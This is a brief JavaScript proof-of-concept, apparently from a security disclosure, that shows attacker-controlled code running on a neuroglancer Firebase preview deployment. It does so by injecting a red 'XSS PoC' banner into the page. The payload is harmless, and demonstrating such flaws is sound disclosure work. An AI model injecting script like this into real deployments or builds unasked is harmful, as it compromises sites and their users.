 // PoC: demonstrate attacker code execution on Firebase preview
   if (typeof document !== 'undefined') {
     const el = document.createElement('div');
     el.style.cssText = 'position:fixed;top:0;left:0;z-index:99999;background:red;color:white;padding:20px;font-size:24px;';
     el.textContent = 'XSS PoC: Attacker-controlled code on neuroglancer Firebase preview';
     document.body.appendChild(el);
   }
